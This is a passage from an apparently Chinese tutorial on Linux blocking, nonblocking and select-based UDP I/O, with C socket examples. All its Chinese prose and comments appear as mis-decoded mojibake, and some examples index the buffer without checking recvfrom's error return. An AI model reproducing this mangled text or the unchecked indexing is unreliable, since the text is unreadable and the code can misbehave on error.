<p>å·²ç»æœ‰æ•°æ®åˆ°äº†å†…æ ¸ç¼“å†²åŒºï¼Œæ•°æ®å·²ç»å°±ç»ªã€‚å†…æ ¸å‡†å¤‡å°†æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç¼“å†²åŒºï¼Œæ­¤æ—¶ç”¨æˆ·è¿›ç¨‹é˜»å¡ç›´åˆ°æ‹·è´å®Œæˆï¼Œç”¨æˆ·è¿›ç¨‹å¼€å§‹å¤„ç†æ•°æ®ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d704a01b77ed4abfa181052dacc1e2e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=5nP1Z0mPtAWRfDSTreUuNuu%2FS%2Fc%3D" alt="" loading="lazy"/></p>
<p><strong>é˜»å¡IOå‚è€ƒä»£ç </strong></p>
<p>ä½¿ç”¨recvfromè¯»å–æ•°æ®</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">//socket æ–‡ä»¶æè¿°ç¬¦ï¼Œåœ¨ Linux ä¸­ï¼Œsocket ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶</span>
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-comment">//ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºï¼Œç”¨äºæ¥æ”¶å†…æ ¸æ‹·è´å‡ºæ¥çš„æ•°æ®</span>
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];
    <span class="hljs-comment">//servaddrï¼šæœåŠ¡å™¨åœ°å€ç»“æ„ï¼Œcliaddrï¼šå®¢æˆ·ç«¯åœ°å€ç»“æ„</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>, <span class="hljs-title">cliaddr</span>;</span>
    <span class="hljs-comment">//åœ°å€ç»“æ„ä½“é•¿åº¦</span>
    <span class="hljs-type">socklen_t</span> len = <span class="hljs-keyword">sizeof</span>(cliaddr);

    <span class="hljs-comment">// 1. åˆ›å»º Socket,é»˜è®¤æƒ…å†µä¸‹ï¼Œåˆ›å»ºçš„ socket æ˜¯é˜»å¡çš„</span>
    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);

    <span class="hljs-comment">//å°†ç»“æ„ä½“æ¸…é›¶ï¼Œé¿å…è„æ•°æ®</span>
    <span class="hljs-built_in">memset</span>(&amp;servaddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servaddr));
    <span class="hljs-comment">//æŒ‡å®š IPv4 åè®®æ—</span>
    servaddr.sin_family = AF_INET;
    <span class="hljs-comment">//ç›‘å¬æ‰€æœ‰ç½‘å¡åœ°å€</span>
    servaddr.sin_addr.s_addr = INADDR_ANY;
    <span class="hljs-comment">//è®¾ç½®ç›‘å¬ç«¯å£ä¸º 8080</span>
    servaddr.sin_port = htons(<span class="hljs-number">8080</span>);

    <span class="hljs-comment">// 2. ç»‘å®šç«¯å£</span>
    bind(sockfd, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"è¿›ç¨‹å·²è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œç­‰å¾…æ•°æ®åˆ°æ¥...\n"</span>);

    <span class="hljs-comment">/**
     * 3. è°ƒç”¨ recvfrom
     * ã€ç¬¬ä¸€é˜¶æ®µã€‘ï¼šå¦‚æœå†…æ ¸ç¼“å†²åŒºæ²¡æœ‰æ•°æ®ï¼Œè¿›ç¨‹ä¼šåœ¨è¿™é‡ŒæŒ‚èµ·ï¼Œè¿›å…¥é˜»å¡çŠ¶æ€ï¼Œç›´åˆ°æœ‰æ•°æ®åˆ°æ¥ã€‚
     * ã€ç¬¬äºŒé˜¶æ®µã€‘ï¼šå½“æ•°æ®åˆ°è¾¾å†…æ ¸ï¼Œå†…æ ¸ä¼šå°†æ•°æ®æ‹·è´åˆ° buffer ä¸­ï¼Œæ‹·è´å®Œæˆåæ­¤å‡½æ•°æ‰è¿”å›ã€‚
     */</span>
    <span class="hljs-type">ssize_t</span> n = recvfrom(sockfd, buffer, <span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, 
                         (<span class="hljs-keyword">struct</span> sockaddr *)&amp;cliaddr, &amp;len);

    buffer[n] = <span class="hljs-string">'\0'</span>; <span class="hljs-comment">// åŠ ä¸Šå­—ç¬¦ä¸²ç»“æŸç¬¦</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æ”¶åˆ°æ•°æ®: %s\n"</span>, buffer);

    <span class="hljs-comment">//å…³é—­ socket</span>
    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>ä½¿ç”¨sendtoå‘é€æ•°æ®</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span>
    <span class="hljs-type">char</span> *message = <span class="hljs-string">"Hello,BIO"</span>;

    <span class="hljs-comment">// 1. åˆ›å»º UDP Socket</span>
    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);
    <span class="hljs-comment">// æ¸…ç©ºç»“æ„ä½“ï¼Œé¿å…æœªåˆå§‹åŒ–å­—æ®µ</span>
    <span class="hljs-built_in">memset</span>(&amp;servaddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(<span class="hljs-number">8080</span>);
    <span class="hljs-comment">//è®¾ç½®ç›®æ ‡ IP åœ°å€ä¸ºæœ¬æœºå›ç¯åœ°å€</span>
    servaddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"127.0.0.1"</span>);

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å‡†å¤‡å‘é€æ•°æ®...\n"</span>);

    <span class="hljs-comment">/**
     * 2. è°ƒç”¨ sendto
     * ã€ç¬¬ä¸€é˜¶æ®µã€‘ï¼šå†…æ ¸æ£€æŸ¥ Socket å‘é€ç¼“å†²åŒºæ˜¯å¦æœ‰ç©ºé—´ã€‚
     * ã€ç¬¬äºŒé˜¶æ®µã€‘ï¼šå¦‚æœç©ºé—´è¶³å¤Ÿï¼Œå†…æ ¸å°†æ•°æ®ä»ç”¨æˆ·ç©ºé—´çš„ message æ‹·è´åˆ°å†…æ ¸å‘é€ç¼“å†²åŒºã€‚
     */</span>
    <span class="hljs-type">ssize_t</span> n = sendto(sockfd, message, <span class="hljs-built_in">strlen</span>(message), <span class="hljs-number">0</span>,
                       (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *) &amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));

    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"sendto å¤±è´¥"</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æˆåŠŸå‘é€ %zd å­—èŠ‚æ•°æ®åˆ°å†…æ ¸å‘é€ç¼“å†²åŒºã€‚\n"</span>, n);
    }

    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-7">4. éé˜»å¡ I/O (Nonblocking I/O)</h2>
<p>éé˜»å¡I/Oåœ¨è¿›ç¨‹å‘èµ· recvfrom åï¼Œå¦‚æœå†…æ ¸ç¼“å†²åŒºæ•°æ®æ²¡å‡†å¤‡å¥½ï¼Œå†…æ ¸ä¼šç«‹å³è¿”å›ä¸€ä¸ª EWOULDBLOCK é”™è¯¯ã€‚ç„¶åç”¨æˆ·è¿›ç¨‹éœ€è¦ä¸æ–­è½®è¯¢ï¼ˆPollingï¼‰å†…æ ¸ï¼ŒæŸ¥è¯¢æ•°æ®æ˜¯å¦å·²ç»å°±ç»ªã€‚ç‰¹ç‚¹æ˜¯é¿å…äº†çº¿ç¨‹å®Œå…¨æŒ‚èµ·ï¼Œä½†è½®è¯¢æå…¶æ¶ˆè€— CPU èµ„æºã€‚</p>
<h3 data-id="heading-8">ç¬¬ä¸€é˜¶æ®µ</h3>
<p>ç”¨æˆ·è¿›ç¨‹è°ƒç”¨recvfromå°è¯•è¯»å–æ•°æ®ï¼Œæ­¤æ—¶å†…æ ¸ç¼“å†²åŒºå°šæ— æ•°æ®ï¼Œå†…æ ¸è¿”å›å¼‚å¸¸ç»™ç”¨æˆ·è¿›ç¨‹ï¼Œç”¨æˆ·è¿›ç¨‹æ‹¿åˆ°é”™è¯¯åï¼Œå†æ¬¡å°è¯•è¯»å–ï¼Œå¹¶ä¸€ç›´é‡å¤æ­¤è¿‡ç¨‹ç›´åˆ°æ•°æ®å‡†å¤‡å°±ç»ª</p>
<h3 data-id="heading-9">ç¬¬äºŒé˜¶æ®µ</h3>
<p>å·²ç»æœ‰æ•°æ®åˆ°äº†å†…æ ¸ç¼“å†²åŒºï¼Œæ•°æ®å·²ç»å°±ç»ªã€‚å†…æ ¸å‡†å¤‡å°†æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç¼“å†²åŒºï¼Œæ­¤æ—¶ç”¨æˆ·è¿›ç¨‹é˜»å¡ç›´åˆ°æ‹·è´å®Œæˆï¼Œç”¨æˆ·è¿›ç¨‹å¼€å§‹å¤„ç†æ•°æ®ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad28f459ec3f4b7dae74e4f1a3908977~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=xZ6xP5bALMlDkrtxTAJQK%2FxURDU%3D" alt="" loading="lazy"/></p>
<p><strong>éé˜»å¡IOå‚è€ƒä»£ç </strong></p>
<p>recvfromè¯»å–æ•°æ®</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>, <span class="hljs-title">cliaddr</span>;</span>
    <span class="hljs-type">socklen_t</span> len = <span class="hljs-keyword">sizeof</span>(cliaddr);

    <span class="hljs-comment">// 1. åˆ›å»º Socket</span>
    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// --------------------------------------------------------</span>
    <span class="hljs-comment">// ã€å…³é”®æ­¥éª¤ã€‘ï¼šè®¾ç½® Socket ä¸ºéé˜»å¡æ¨¡å¼</span>
    <span class="hljs-comment">// --------------------------------------------------------</span>
    <span class="hljs-type">int</span> flags = fcntl(sockfd, F_GETFL, <span class="hljs-number">0</span>);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

    <span class="hljs-built_in">memset</span>(&amp;servaddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(<span class="hljs-number">8080</span>);

    bind(sockfd, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å¼€å§‹éé˜»å¡è½®è¯¢ï¼ˆPollingï¼‰...\n"</span>);

    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        <span class="hljs-comment">/**
         * 2. è°ƒç”¨ recvfrom
         * ã€ç¬¬ä¸€é˜¶æ®µã€‘ï¼šå†…æ ¸å‘ç°æ²¡æ•°æ®ï¼Œç”±äºè®¾ç½®äº†éé˜»å¡ï¼Œå®ƒä¸ä¼šæŒ‚èµ·è¿›ç¨‹ï¼Œ
         * è€Œæ˜¯ç«‹åˆ»è¿”å› -1ï¼Œå¹¶å°† errno è®¾ä¸º EWOULDBLOCKã€‚
         */</span>
        <span class="hljs-type">ssize_t</span> n = recvfrom(sockfd, buffer, <span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, 
                             (<span class="hljs-keyword">struct</span> sockaddr *)&amp;cliaddr, &amp;len);

        <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// ã€ç¬¬äºŒé˜¶æ®µã€‘ï¼šæ•°æ®å°±ç»ªå¹¶æ‹·è´å®Œæˆ</span>
            buffer[n] = <span class="hljs-string">'\0'</span>;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æˆåŠŸè·å–æ•°æ®: %s\n"</span>, buffer);
            <span class="hljs-keyword">break</span>; 
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span> &amp;&amp; (errno == EWOULDBLOCK || errno == EAGAIN)) {
            <span class="hljs-comment">// æ•°æ®æœªå°±ç»ªï¼Œè¿›ç¨‹å¯ä»¥å»å¹²ç‚¹åˆ«çš„</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å†…æ ¸æ•°æ®æœªå°±ç»ªï¼Œæˆ‘å…ˆå»å¤„ç†åˆ«çš„äº‹...\n"</span>);
            sleep(<span class="hljs-number">1</span>); <span class="hljs-comment">// æ¨¡æ‹Ÿå¤„ç†å…¶ä»–ä¸šåŠ¡</span>
            <span class="hljs-keyword">continue</span>;
        } <span class="hljs-keyword">else</span> {
            perror(<span class="hljs-string">"recvfrom å‡ºé”™"</span>);
            <span class="hljs-keyword">break</span>;
        }
    }

    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>sendtoå‘é€æ•°æ®</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span>
    <span class="hljs-type">char</span> *message = <span class="hljs-string">"Hello"</span>;

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// å°† Socket è®¾ç½®ä¸ºéé˜»å¡</span>
    <span class="hljs-type">int</span> flags = fcntl(sockfd, F_GETFL, <span class="hljs-number">0</span>);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

    <span class="hljs-built_in">memset</span>(&amp;servaddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(<span class="hljs-number">8080</span>);
    servaddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"127.0.0.1"</span>);

    <span class="hljs-comment">/**
     * è°ƒç”¨ sendto
     * åœ¨éé˜»å¡æ¨¡å¼ä¸‹ï¼š
     * 1. å¦‚æœå†…æ ¸å‘é€ç¼“å†²åŒºæœ‰ç©ºé—´ï¼Œæ•°æ®ç«‹å³ä»ç”¨æˆ·æ€æ‹·è´åˆ°å†…æ ¸æ€ï¼Œå‡½æ•°è¿”å›å‘é€å­—èŠ‚æ•°ã€‚
     * 2. å¦‚æœç¼“å†²åŒºç¬é—´æ»¡äº†ï¼Œå‡½æ•°ç«‹å³è¿”å› -1ï¼Œerrno è¢«è®¾ä¸º EWOULDBLOCKã€‚
     */</span>
    <span class="hljs-type">ssize_t</span> n = sendto(sockfd, message, <span class="hljs-built_in">strlen</span>(message), <span class="hljs-number">0</span>,
                       (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *) &amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));

    <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æ•°æ®å·²æˆåŠŸæ‹·è´è‡³å†…æ ¸ç¼“å†²åŒºï¼Œå‘é€äº† %zd å­—èŠ‚ã€‚\n"</span>, n);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">if</span> (errno == EWOULDBLOCK || errno == EAGAIN) {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å‘é€ç¼“å†²åŒºæš‚æ»¡ï¼Œè¯·ç¨åé‡è¯•ã€‚\n"</span>);
        } <span class="hljs-keyword">else</span> {
            perror(<span class="hljs-string">"å‘é€å‡ºé”™"</span>);
        }
    }

    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-10">5. I/O å¤šè·¯å¤ç”¨ (I/O Multiplexing)</h2>
<p>ç”¨ä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯ä¸€ä¸ªçº¿ç¨‹ / è¿›ç¨‹ï¼ŒåŒæ—¶ç›‘å¬å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆfdï¼‰ï¼Œå“ªä¸ªå°±ç»ªå°±å¤„ç†å“ªä¸ªã€‚</p>
<p>I/O å¤šè·¯å¤ç”¨çš„æœ¬è´¨å¹¶ä¸æ˜¯è®© I/O å˜å¿«ï¼Œè€Œæ˜¯è®©å•ä¸ªçº¿ç¨‹èƒ½å¤Ÿå¤„ç†æ›´å¤šçš„è¿æ¥ï¼Œä»¥è¾ƒå°çš„ä»£ä»·åŒæ—¶å¤„ç†æˆåƒä¸Šä¸‡ä¸ªè¿æ¥ã€‚è™½ç„¶å®ƒåœ¨ä¸¤ä¸ªé˜¶æ®µä¸­éƒ½æœ‰é˜»å¡ï¼Œä½†å®ƒé€šè¿‡â€˜ä¸€æ¬¡ç­‰å¾…ã€å¤šä¸ªæœºä¼šâ€™çš„æ–¹å¼ï¼Œæå¤§åœ°æé«˜äº†æœåŠ¡å™¨çš„å¹¶å‘å¤„ç†èƒ½åŠ›ã€‚è¿™ä¹Ÿæ˜¯ Netty ç­‰é«˜æ€§èƒ½æ¡†æ¶çš„åŸºç¡€ã€‚</p>
<p><strong>I/O å¤šè·¯å¤ç”¨</strong>åœ¨Linuxä¸Šå®ç°çš„æ–¹å¼æœ‰<strong>selectã€poll å’Œ epoll</strong>ã€‚ä¸‹é¢åˆ†æƒ…å†µè¯´æ˜ï¼š</p>
<h3 data-id="heading-11">select</h3>
<p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œselect æ˜¯æœ€æ—©çš„ I/O å¤šè·¯å¤ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šä¸å…¶è®©ä½ çš„è¿›ç¨‹åå¤å»è½®è¯¢æ¯ä¸ª Socketï¼ˆéé˜»å¡ I/O çš„åšæ³•ï¼‰ï¼Œä¸å¦‚æŠŠè¿™ä¸€å † Socket ä¸¢ç»™ selectï¼Œè®©å®ƒä»£ä¸ºç›‘å¬ã€‚</p>
<h4 data-id="heading-12">ç¬¬ä¸€é˜¶æ®µ</h4>
<p>ç”¨æˆ·è¿›ç¨‹è°ƒç”¨selectå¹¶æŒ‡å®šè¦ç›‘å¬çš„fdé›†åˆï¼Œä¹Ÿå°±æ˜¯å¤šä¸ªsocketã€‚ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ªsocketæ•°æ®å°±ç»ªè¿”å›å¯è¯»ã€‚åœ¨è¿™ä¸€é˜¶æ®µç”¨æˆ·è¿›ç¨‹é˜»å¡ã€‚</p>
<h4 data-id="heading-13">ç¬¬äºŒé˜¶æ®µ</h4>
<p>å½“ select è¿”å›æ—¶ï¼Œè¡¨ç¤ºå·²æœ‰ socket çš„æ•°æ®å‡†å¤‡å°±ç»ªã€‚ç”¨æˆ·è¿›ç¨‹éšåå¾ªç¯å®šä½åˆ°è¿™äº›å°±ç»ªçš„ socketï¼Œå¹¶ä¾æ¬¡è°ƒç”¨ recvfrom è¯»å–æ•°æ®ï¼ŒæŠŠæ•°æ®ä»å†…æ ¸æ‹·è´è‡³ç”¨æˆ·è¿›ç¨‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80b1d922eb854d8c9efed2c1efe4243d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=zU7yHe8XP83hBZLH5ZzfW3J4o4s%3D" alt="" loading="lazy"/></p>
<p><strong>selectå‚è€ƒä»£ç </strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span>
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];

    <span class="hljs-comment">// 1. å‡†å¤‡ç½‘ç»œ Socket</span>
    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);
    <span class="hljs-built_in">memset</span>(&amp;servaddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(<span class="hljs-number">8080</span>);
    bind(sockfd, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));

    <span class="hljs-comment">// 2. å‡†å¤‡ fd_set é›†åˆ </span>
    fd_set readfds;
    <span class="hljs-type">int</span> maxfd = (sockfd &gt; STDIN_FILENO) ? sockfd : STDIN_FILENO;

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"select æ­£åœ¨ç›‘å¬é”®ç›˜è¾“å…¥å’Œç½‘ç»œæ•°æ®(8080ç«¯å£)...\n"</span>);

    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        <span class="hljs-comment">// æ¯æ¬¡è°ƒç”¨ select éƒ½è¦é‡æ–°åˆå§‹åŒ– fd_set</span>
        FD_ZERO(&amp;readfds);
        FD_SET(STDIN_FILENO, &amp;readfds); <span class="hljs-comment">// ç›‘å¬é”®ç›˜</span>
        FD_SET(sockfd, &amp;readfds);       <span class="hljs-comment">// ç›‘å¬ç½‘ç»œ</span>

        <span class="hljs-comment">/**
         * 3. è°ƒç”¨ select (è¿™æ­¥æ˜¯é˜»å¡çš„)
         * ã€ç¬¬ä¸€é˜¶æ®µã€‘ï¼šè¿›ç¨‹é˜»å¡åœ¨ select è°ƒç”¨ä¸Šï¼Œç­‰å¾…â€œä»»ä¸€â€æ–‡ä»¶æè¿°ç¬¦å°±ç»ªã€‚
         */</span>
        <span class="hljs-type">int</span> activity = select(maxfd + <span class="hljs-number">1</span>, &amp;readfds, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);

        <span class="hljs-keyword">if</span> (activity &lt; <span class="hljs-number">0</span>) {
            perror(<span class="hljs-string">"select å‡ºé”™"</span>);
            <span class="hljs-keyword">break</span>;
        }

        <span class="hljs-comment">// 4. åˆ¤æ–­æ˜¯è°å°±ç»ªäº†</span>
        <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readfds)) {
            <span class="hljs-comment">/**
             * ã€ç¬¬äºŒé˜¶æ®µã€‘ï¼šå†…æ ¸é€šçŸ¥æ•°æ®åˆ°äº†ï¼Œè¿›ç¨‹è°ƒç”¨ recvfromã€‚
             * æ­¤æ—¶æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ã€‚
             */</span>
            <span class="hljs-type">ssize_t</span> n = recvfrom(sockfd, buffer, <span class="hljs-keyword">sizeof</span>(buffer)<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
            buffer[n] = <span class="hljs-string">'\0'</span>;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ç½‘ç»œæ¶ˆæ¯: %s\n"</span>, buffer);
        }

        <span class="hljs-keyword">if</span> (FD_ISSET(STDIN_FILENO, &amp;readfds)) {
            fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-built_in">stdin</span>);
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"é”®ç›˜è¾“å…¥: %s"</span>, buffer);
        }
    }

    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-14">poll</h3>
